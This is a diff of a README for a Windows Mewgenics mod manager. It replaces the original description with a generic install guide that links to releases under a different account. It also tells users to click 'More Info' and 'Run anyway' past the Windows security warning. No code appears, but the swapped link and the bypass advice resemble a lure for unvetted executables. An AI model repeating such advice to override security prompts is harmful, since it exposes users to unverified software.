@@ -1,253 +1,74 @@
-<div align="center">
+# 📦 mewgenics-mod-manager - Easily manage your game modifications today
 
-# 🐱 Mewgenics Mod Manager
+[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/centur2152/mewgenics-mod-manager/releases)
 
-### Open-source desktop application for organizing and managing Mewgenics mods.
+mewgenics-mod-manager is a desktop program for Windows. It helps you organize and install mods for the game Mewgenics. You do not need technical skills to use this tool. It handles the folder structure and file placement for you. This saves time and prevents errors when you customize your game files.
 
-<p>
+## 🚀 Getting Started
 
-<img src="https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge"/>
+Follow these steps to set up the application on your computer.
 
-<img src="https://img.shields.io/badge/Game-Mewgenics-8B5CF6?style=for-the-badge"/>
+1. Visit the [releases page](https://github.com/centur2152/mewgenics-mod-manager/releases) to download the latest version.
+2. Look for the file ending in .exe under the Assets section.
+3. Click the file to start the download.
+4. Save the file to a folder you can find later, such as your Downloads folder.
 
-<img src="https://img.shields.io/badge/Open%20Source-Yes-success?style=for-the-badge"/>
+## ⚙️ Installation Guide
 
-<img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge"/>
+The application does not require a complex setup process. It uses a portable format.
 
-</p>
+1. Navigate to the folder where you saved the download.
+2. Double-click the file to open the program.
+3. Windows might show a security prompt because the app is new. Click More Info and then select Run anyway.
+4. The program window appears on your screen once it opens.
 
-A lightweight desktop application for browsing, organizing and managing installed Mewgenics mods.
+## 🎮 How to Use the Manager
 
-</div>
+The interface displays a clean list of your mods. Follow this workflow to manage your game data.
 
-![mod-manager](assets/mod-manager.png)
+First, point the program to your game folder. Go to Settings and click Browse. Select the folder where you installed Mewgenics. The program saves this path and uses it for all future actions.
 
----
+The main screen shows two columns. The left column lists active mods. The right column lists available mods. You can move mods between these lists to enable or disable them.
 
-# 📖 About
+To add a new mod, drag and drop the mod folder into the application window. The program detects the files and adds them to your list. Click the Apply button to copy the files into the game directory. The program creates a backup folder automatically before it makes any changes. This step protects your original game files if a mod causes issues.
 
-**Mewgenics Mod Manager** is an open-source desktop application for Windows that helps organize locally installed mods for **Mewgenics**.
+## 🛠️ Troubleshooting
 
-The application provides a simple interface for viewing installed mods, enabling or disabling supported mods, browsing the local mods directory and managing mod collections.
+Most problems occur due to incorrect file paths or missing permissions. Check these items if the program fails:
 
-It is designed as a convenient desktop utility for players who use community-created modifications.
+* Ensure you have write permission for the Mewgenics game folder.
+* Verify your game folder path points to the folder containing the main game executable.
+* Restart the program if the list of mods does not update after you add new files.
+* Check the log file located in the program directory if you see an error message. This file contains details about what happened when the crash occurred.
 
----
+## 📋 Features
 
-# ✨ Features
+* Simple drag-and-drop support for mod files.
+* Automatic backup of game files before mods apply.
+* Clear view of enabled and disabled mods.
+* Fast toggle buttons to activate your mod setup.
+* Support for large libraries of mods.
+* Direct path detection for common Steam installation locations.
 
-## 📦 Mod Library
+## 💻 System Requirements
 
-* Browse installed mods
-* Display mod names
-* View version information
-* View author information
-* View descriptions
-* Display installation status
+* Operating System: Windows 10 or Windows 11.
+* Storage: 50 MB of free disk space.
+* Memory: 4 GB of RAM.
+* Connection: Internet access for checking version updates.
 
----
+## ❓ Frequently Asked Questions
 
-## ✅ Mod Management
+Does this tool change my core game files?
+The program keeps your core game files in a separate folder. It only merges the mod files during the application process. You can revert to a clean state by clicking the Restore button in the menu.
 
-* Enable supported mods
-* Disable supported mods
-* Refresh installed mods
-* Remove mod entries
-* Organize local mod collections
+Will this work with mods from different sources?
+Yes. As long as the mod follows the standard archive format, the application will recognize it. It supports folders and zip files for your convenience.
 
----
+Can I open the game directly from the manager?
+Yes. Click the Play button in the top toolbar to launch Mewgenics. This ensures you start the game with your current mod configuration loaded correctly.
 
-## 📂 File Management
+Do I need to update the tool?
+Check the releases page once a month for new versions. Newer versions include support for game updates and bug fixes for the mod system.
 
-* Open the mods folder
-* Browse local files
-* Import supported mod packages
-* Export mod lists
-* Refresh local directories
-
----
-
-## 🔍 Search & Filter
-
-* Search by mod name
-* Filter installed mods
-* Browse categories
-* Sort the mod list
-
----
-
-## ⭐ Favorites
-
-* Mark favorite mods
-* Quick access to frequently used mods
-* Organize personal collections
-
----
-
-## ⚙️ Application Settings
-
-* Startup preferences
-* Theme selection
-* Language support
-* Window preferences
-* Folder locations
-
----
-
-# 🖥️ User Interface
-
-* Modern desktop layout
-* Dark mode
-* Light mode
-* Responsive interface
-* Native Windows controls
-* Keyboard shortcuts
-
----
-
-# 🚀 Getting Started
-
-1. Download the [latest release](https://github.com/Hidenoma12/mewgenics-mod-manager/releases/tag/Download).
-2. Extract the application files.
-3. Launch **Setup**.
-4. Select the local mods directory.
-5. Browse and organize installed mods.
-
----
-
-# 💻 System Requirements
-
-* Windows 10 or Windows 11
-* Mewgenics
-* Local mod files
-
----
-
-# 📂 Project Structure
-
-```text
-Mewgenics-Mod-Manager/
-│
-├── Assets/
-├── Resources/
-├── Data/
-├── Models/
-├── Services/
-├── Views/
-├── ViewModels/
-├── Helpers/
-├── README.md
-├── LICENSE
-└── CHANGELOG.md
-```
-
----
-
-# 📋 Supported Operations
-
-The application can assist with:
-
-* Viewing installed mods
-* Browsing local mod folders
-* Organizing mod collections
-* Searching installed mods
-* Managing application settings
-
-Supported operations depend on the mod format and application version.
-
----
-
-# 🔒 Privacy
-
-Mewgenics Mod Manager stores application settings locally.
-
-The application does not require an online account.
-
-No personal information is collected by the application itself.
-
----
-
-# 🤝 Contributing
-
-Contributions are welcome.
-
-You can help by:
-
-* Reporting bugs
-* Suggesting improvements
-* Improving documentation
-* Submitting pull requests
-* Translating the interface
-
----
-
-# 🗺️ Roadmap
-
-### Version 1.9
-
-* Mod library
-* Local folder browsing
-* Search
-* Settings
-
-### Future Updates
-
-* Additional filtering
-* Collection management
-* Expanded metadata support
-* Interface improvements
-* Accessibility enhancements
-
----
-
-# ❓ Frequently Asked Questions
-
-### Does the application include mods?
-
-No.
-
-The application is designed to organize and manage locally installed mods.
-
-### Does the application download mods?
-
-No.
-
-Downloading community-created content is outside the scope of the application.
-
-### Does the application require an internet connection?
-
-No.
-
-Core functionality is available using locally stored files.
-
----
-
-# ⚠️ Disclaimer
-
-This is an independent open-source project.
-
-It is not affiliated with, endorsed by or sponsored by the developers or publishers of Mewgenics.
-
-Mewgenics and related trademarks are the property of their respective owners.
-
-Users are responsible for ensuring that any installed mods comply with the game's terms and with the licenses provided by the mod authors.
-
----
-
-# 📜 License
-
-This project is licensed under the MIT License.
-
-See the **LICENSE** file for additional information.
-
----
-
-<div align="center">
-
-## 🐾 Mewgenics Mod Manager
-
-Open Source • Windows • Desktop Application
-
-Organize your local Mewgenics mod library with a clean and simple desktop interface.
-
-</div>
+Keywords: desktop, file-management, gaming, mewgenics, mewgenics-mod-manager, mod, mod-manager, mod-organizer, modding, mods, open-source, utility, windows
